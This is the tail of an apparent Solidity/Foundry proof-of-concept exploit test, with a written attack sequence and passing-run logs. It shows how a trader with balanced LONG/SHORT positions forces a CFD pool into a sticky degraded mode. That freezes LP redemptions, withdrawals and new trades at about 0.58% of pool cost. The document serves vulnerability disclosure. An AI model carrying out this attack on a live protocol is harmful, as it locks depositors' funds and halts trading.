        uint256 E0 = _effectiveAssets(s);
        emit log_named_uint("pool effective assets E0 before attack (USDG atoms)", E0);

        // --------------------------------------------------------------
        // ATTACK step 1: fill the book to the admission boundary with
        // self-offsetting LONG/SHORT pairs (two accounts, zero net skew).
        // Pairs repeat one size until it fails, then halve, down to $1000.
        // --------------------------------------------------------------
        uint256 longNotional;
        uint256 shortNotional;
        {
            uint256 size = 3_000_000e6; // below the 40% skew cap at each intermediate state
            bool firstLong = true;
            bool firstShort = true;
            while (size >= 1_000e6) {
                // The first LONG leg pledges enough margin to keep the losing leg far
                // above maintenance through the +1.2% move; every leg supplies the 20bps
                // initial margin that funds its dedicated liquidation reserve.
                uint256 longMargin = (size * INIT_MARGIN_BPS) / 10_000 + (firstLong ? 250_000e6 : 0);
                if (_tryOpen(s, attackerLong, CfdTypes.Side.LONG, size, longMargin)) {
                    longNotional += size;
                    firstLong = false;
                    // Balancing SHORT leg (halve on failure near the boundary).
                    uint256 ssize = size;
                    while (ssize >= 1_000e6) {
                        uint256 shortMargin = (ssize * INIT_MARGIN_BPS) / 10_000 + (firstShort ? 100_000e6 : 0);
                        if (_tryOpen(s, attackerShort, CfdTypes.Side.SHORT, ssize, shortMargin)) {
                            shortNotional += ssize;
                            firstShort = false;
                            break;
                        }
                        ssize /= 2;
                    }
                } else {
                    size /= 2;
                }
            }
        }
        emit log_named_uint("attacker LONG notional (USDG atoms)", longNotional);
        emit log_named_uint("attacker SHORT notional (USDG atoms)", shortNotional);

        uint256 E1 = _effectiveAssets(s);
        uint256 L1 = _maxLiability(s);
        uint256 bufferTarget = (L1 * 25) / 10_000; // settlementBufferBps = 25
        emit log_named_uint("E after book build", E1);
        emit log_named_uint("L after book build (remaining side max profit)", L1);
        emit log_named_uint("headroom E - L - buffer (USDG atoms)", E1 > L1 + bufferTarget ? E1 - L1 - bufferTarget : 0);
        assertGt(L1, 9_000_000e6, "book must be filled to the admission boundary");
        assertApproxEqAbs(L1, longNotional + 500_000e6, 1_000e6, "L is the long side incl. the bystander");
        assertApproxEqAbs(longNotional, shortNotional, 1_000e6, "attacker book is self-offsetting");
        assertLt(E1 - L1, 2 * bufferTarget, "book sits at the admission boundary (buffer headroom only)");

        // --------------------------------------------------------------
        // ATTACK step 2: ordinary market move, +1.2% on the basket mark.
        // --------------------------------------------------------------
        s.pyth.setPrice(EURUSD_UP, 0);
        vm.warp(block.timestamp + 2);
        _refreshMark(s);
        assertEq(s.engine.lastMarkPrice(), 101_200_000, "mark moved +1.2%");

        // --------------------------------------------------------------
        // ATTACK step 3: close the winning SHORT leg. The realized profit
        // drains E below the remaining LONG side's maximum-profit liability
        // and latches degraded mode.
        // --------------------------------------------------------------
        assertTrue(_closeAll(s, attackerShort, CfdTypes.Side.SHORT), "attacker short close");
        assertTrue(s.engine.degradedMode(), "degraded mode must be latched");
        uint256 E2 = _effectiveAssets(s);
        uint256 L2 = _maxLiability(s);
        emit log_named_uint("E after winning-leg close", E2);
        emit log_named_uint("L after winning-leg close", L2);
        emit log_named_uint("insolvency hole L - E (USDG atoms)", L2 - E2);
        assertLt(E2, L2, "E < L after the winning leg closes");

        // --------------------------------------------------------------
        // Frozen state: LP settlement, LP entry, new opens, and withdrawals
        // for accounts with open positions all revert.
        // --------------------------------------------------------------
        vm.warp(_epochStart(block.timestamp) + 1 hours + 60); // victim redemption epoch has matured
        assertTrue(s.juniorVault.claimableRedeemRequest(redeemEpochId, victimLP) == 0, "redemption unfunded");

        // 1) LP redemption funding (router route) reverts on the degraded latch.
        try s.router.settleLpEpoch{value: 1 wei}(pythData) {
            assertTrue(false, "router LP settlement must revert while degraded");
        } catch (bytes memory reason) {
            assertEq(
                bytes4(reason), IHousePool.HousePool__DegradedMode.selector, "router LP settlement frozen by latch"
            );
        }
        // 2) The direct permissionless route cannot bypass the frozen router route.
        try s.pool.settleLpEpoch(s.engine.lastMarkPrice(), s.engine.lastMarkTime()) {
            assertTrue(false, "direct LP settlement must not succeed while degraded");
        } catch (bytes memory reason) {
            emit log_named_string("direct settle revert data", vm.toString(reason));
        }
        // 3) LP deposit-entry activation is blocked.
        assertFalse(s.pool.canSettleDepositEntries(), "deposit entries must be blocked");
        // 4) An account with an open position cannot withdraw any margin.
        vm.prank(bystander);
        try s.clearinghouse.withdraw(bystander, 1) {
            assertTrue(false, "open-position withdrawal must revert while degraded");
        } catch (bytes memory reason) {
            assertEq(
                bytes4(reason),
                ICfdEngineTypes.CfdEngine__DegradedMode.selector,
                "open-position margin withdrawal frozen by latch"
            );
        }
        // 5) New opens are rejected at commit.
        vm.startPrank(bystander);
        try s.router.commitOrder(
            OrderV3Types.OrderRequest({
                clientOrderId: bytes32(clientSeq++),
                side: CfdTypes.Side.LONG,
                sizeDelta: CfdTypes.SIZE_QUANTUM,
                marginDelta: 5_000e6,
                targetPrice: 1,
                isClose: false,
                bounds: _bounds(s)
            })
        ) {
            assertTrue(false, "new open commit must be rejected while degraded");
        } catch (bytes memory reason) {
            assertEq(
                bytes4(reason), IOrderRouterErrors.OrderRouter__DegradedMode.selector, "new opens frozen by latch"
            );
        }
        vm.stopPrank();
        assertFalse(_tryOpen(s, bystander, CfdTypes.Side.LONG, 200_000e6, 5_000e6), "opens must be blocked");

        // --------------------------------------------------------------
        // The owner cannot clear: E < L persists while the attacker's
        // losing leg stays open, and that leg is kept healthy on purpose.
        // --------------------------------------------------------------
        vm.prank(owner);
        try s.engine.clearDegradedMode() {
            assertTrue(false, "owner cleared the latch while E < L");
        } catch (bytes memory reason) {
            assertEq(
                bytes4(reason), ICfdEngineTypes.CfdEngine__StillInsolvent.selector, "owner blocked by StillInsolvent"
            );
        }

        {
            // The attacker's remaining LONG position is NOT liquidatable: it is
            // margined far above maintenance at the new mark.
            (uint256 size, uint256 margin, uint256 entryPrice, uint256 maxProfit, CfdTypes.Side side,,) =
                s.engine.positions(attackerLong);
            uint256 entryCost = s.engine.positionEntryCostAssetAtoms(attackerLong);
            bool liquidatable = ICfdEnginePlanner(address(s.engine.planner())).isExactPriceRiskLiquidatable(
                CfdTypes.Position({
                    size: size,
                    margin: margin,
                    entryPrice: entryPrice,
                    maxProfitAssets: maxProfit,
                    side: side,
                    lastUpdateTime: 0,
                    lastCarryTimestamp: 0,
                    vpiAccrued: 0
                }),
                entryCost,
                s.engine.lastMarkPrice(),
                CAP_PRICE,
                margin,
                MAINT_MARGIN_BPS
            );
            assertFalse(liquidatable, "attacker losing leg must stay healthy");
        }

        // A full day later nothing has changed: keepers have nothing to liquidate
        // and the owner still cannot clear the latch (the hold is bounded only by
        // carry erosion of the attacker's collateral or a pool recapitalization,
        // both far slower than one day).
        vm.warp(block.timestamp + 1 days);
        _refreshMark(s);
        assertTrue(s.engine.degradedMode(), "latch persists");
        vm.prank(owner);
        try s.engine.clearDegradedMode() {
            assertTrue(false, "owner cleared the latch while E < L after 1 day");
        } catch (bytes memory reason) {
            assertEq(
                bytes4(reason), ICfdEngineTypes.CfdEngine__StillInsolvent.selector, "owner still blocked after 1 day"
            );
        }
        try s.router.settleLpEpoch{value: 1 wei}(pythData) {
            assertTrue(false, "LP settlement must still revert after 1 day degraded");
        } catch (bytes memory reason) {
            assertEq(bytes4(reason), IHousePool.HousePool__DegradedMode.selector, "settlement still frozen");
        }

        // --------------------------------------------------------------
        // Release (attacker-chosen): close the losing leg, restoring
        // E >= L; the sticky latch still needs the owner to clear it.
        // --------------------------------------------------------------
        assertTrue(_closeAll(s, attackerLong, CfdTypes.Side.LONG), "attacker long close");
        assertTrue(s.engine.degradedMode(), "latch is sticky after solvency is restored");
        assertGe(_effectiveAssets(s), _maxLiability(s), "E >= L restored");

        vm.prank(owner);
        s.engine.clearDegradedMode();
        assertFalse(s.engine.degradedMode(), "owner clears the latch");
    }

    // ------------------------------------------------------------------
    // Test
    // ------------------------------------------------------------------

    function test_PoC_DegradedLatchFreeze() public {
        ScenarioResult memory clean = _runScenario(false);
        ScenarioResult memory attack = _runScenario(true);

        emit log_string("=========================================================");
        emit log_string("Degraded-mode latch freeze attack (release parameters)");
        emit log_string("=========================================================");
        emit log_named_uint("victim redemption proceeds - clean (USDG atoms)", clean.victimProceeds);
        emit log_named_uint("victim redemption proceeds - attack (USDG atoms)", attack.victimProceeds);
        emit log_named_uint("victim unfunded shares remaining - clean", clean.victimUnfundedShares);
        emit log_named_uint("victim unfunded shares remaining - attack", attack.victimUnfundedShares);
        if (attack.victimProceeds >= clean.victimProceeds) {
            emit log_named_uint(
                "victim LP value delta vs clean (attack - clean)", attack.victimProceeds - clean.victimProceeds
            );
        } else {
            emit log_named_uint(
                "victim LP value delta vs clean (attack - clean, negative)", clean.victimProceeds - attack.victimProceeds
            );
        }
        emit log_string("---------------------------------------------------------");
        emit log_named_uint("attacker capital committed (USDG atoms)", ATTACKER_LONG_CAPITAL + ATTACKER_SHORT_CAPITAL);
        emit log_named_uint("attacker net cost of the freeze (USDG atoms)", attack.attackerSpent);
        emit log_named_uint("attacker net cost - clean baseline (USDG atoms)", clean.attackerSpent);
        emit log_named_decimal_uint(
            "attacker net cost as fraction of pool", (attack.attackerSpent * 1e6) / 10_000_000e6, 6
        );
        emit log_string("---------------------------------------------------------");
        emit log_named_uint("junior principal final - clean", clean.juniorPrincipalFinal);
        emit log_named_uint("junior principal final - attack", attack.juniorPrincipalFinal);
        emit log_named_uint("senior principal final - clean", clean.seniorPrincipalFinal);
        emit log_named_uint("senior principal final - attack", attack.seniorPrincipalFinal);
        emit log_named_uint("pool effective assets final - clean", clean.poolEffectiveAssetsFinal);
        emit log_named_uint("pool effective assets final - attack", attack.poolEffectiveAssetsFinal);

        // The attack is real: the freeze is demonstrated inside the attack scenario and
        // costs the attacker only the open/close charges; in this run the LPs even keep
        // the attacker's fee payments, so the impact is the freeze itself (LP exit and
        // trading liveness), not direct value loss at the minimum move size. The junior
        // capacity deferral of the bystander-backed redemption is identical in both runs.
        assertTrue(attack.degradedLatched, "latch was demonstrated inside the attack scenario");
        assertGt(attack.attackerSpent, 0, "attack must have a measurable cost");
        assertLt(attack.attackerSpent, 200_000e6, "attack cost is a small fraction of the pool");
        assertEq(clean.attackerSpent, 0, "clean baseline must not cost the attacker anything");
        assertApproxEqAbs(
            attack.victimUnfundedShares,
            clean.victimUnfundedShares,
            10_000_000_000_000,
            "junior deferral must match the clean baseline after release"
        );
    }
}

```



Attack sequence in the test:
1. Balanced book build: LONG/SHORT pairs on two accounts, repeating a size until the commit-time planner pre-check rejects it (OrderRouter__PredictableOpenInvalid(SOLVENCY_EXCEEDED)) and halving, converging on the admission boundary (converged state: 9,474,609.375 USDG per side, headroom above the buffer: 696 USDG).
2. Basket mark moves +1.2% (mock EURUSD 1.10 -> 1.1132 maps the mark 1.00 -> 1.012 exactly).
3. Full close of the winning SHORT leg: degradedMode latches; E = 9,941,091.59 < L = 9,974,500.00 (hole 33,408.40 USDG).
4. Freeze assertions: router settleLpEpoch reverts HousePool__DegradedMode; direct settleLpEpoch reverts HousePool__Unauthorized (router-gated while positions are open, so no bypass); canSettleDepositEntries() false; bystander margin withdrawal reverts CfdEngine__DegradedMode; bystander new open commit reverts OrderRouter__DegradedMode; a second open attempt through the full commit+execute path fails.
5. Hold assertions: owner clearDegradedMode reverts CfdEngine__StillInsolvent; the attacker's LONG is verified not liquidatable via ICfdEnginePlanner.isExactPriceRiskLiquidatable at the new mark; one full day later the latch persists, the owner is still blocked, and settlement is still frozen.
6. Release assertions: the attacker closes the LONG leg, restoring E >= L; the latch stays set (sticky) until the owner calls clearDegradedMode; the victim's matured redemption then funds and is claimed; the bystander withdraws and re-opens.
7. Accounting: the attacker commits 1,200,000 USDG of margin and recovers all but a net 57,518.39 USDG (0.575% of the pool); the clean baseline costs the attacker 0. The victim's proceeds in the attack run exceed the clean baseline by 55,368.02 USDG (the attacker's charges retained by the junior tranche), with the same junior-capacity deferral in both runs, isolating the damage to the freeze itself.




Logs (passing run, release parameters, 10M USDG pool, forge test --match-contract DegradedLatchFreezePoC -vv):

```
[PASS] test_PoC_DegradedLatchFreeze() (gas: 461193100)
  pool effective assets E0 before attack (USDG atoms): 10000126999975
  attacker LONG notional (USDG atoms): 9474609375000
  attacker SHORT notional (USDG atoms): 9474609375000
  E after book build: 10000132579101
  L after book build (remaining side max profit): 9974500000000
  headroom E - L - buffer (USDG atoms): 696329101
  E after winning-leg close: 9941091596550
  L after winning-leg close: 9974500000000
  insolvency hole L - E (USDG atoms): 33408403450
  direct settle revert data: 0xbd1bc066            // HousePool__Unauthorized, router-gated
  =========================================================
  Degraded-mode latch freeze attack (release parameters)
  =========================================================
  victim redemption proceeds - clean (USDG atoms): 7500080087830
  victim redemption proceeds - attack (USDG atoms): 7555448103284
  victim unfunded shares remaining - clean: 500007353065010
  victim unfunded shares remaining - attack: 496676950305545
  victim LP value delta vs clean (attack - clean): 55368015454
  ---------------------------------------------------------
  attacker capital committed (USDG atoms): 1200000000000
  attacker net cost of the freeze (USDG atoms): 57518391996
  attacker net cost - clean baseline (USDG atoms): 0
  attacker net cost as fraction of pool: 0.005751
  ---------------------------------------------------------
  junior principal final - clean: 500009382429
  junior principal final - attack: 500123537738
  senior principal final - clean: 2000037529716
  senior principal final - attack: 2000494150949
  pool effective assets final - clean: 2500046912145
  pool effective assets final - attack: 2494617688687
Suite result: ok. 1 passed; 0 failed; 0 skipped
```

During the frozen window every asserted revert is the deterministic outcome of the code paths quoted above: HousePool__DegradedMode from _requireWithdrawalsLive on the router settlement route (the direct route reverts HousePool__Unauthorized first, being router-gated while positions are open), CfdEngine__DegradedMode from validateWithdraw for the open-position account, OrderRouter__DegradedMode from _validateOpenCommitAllowed for new opens, and CfdEngine__StillInsolvent from clearDegradedMode for the owner on both days. The final block shows the freeze ends only through the attacker's release plus the owner's explicit clear, after which the victim's redemption funds, the bystander withdraws and re-opens, and the attacker recovers all committed margin minus the charges.

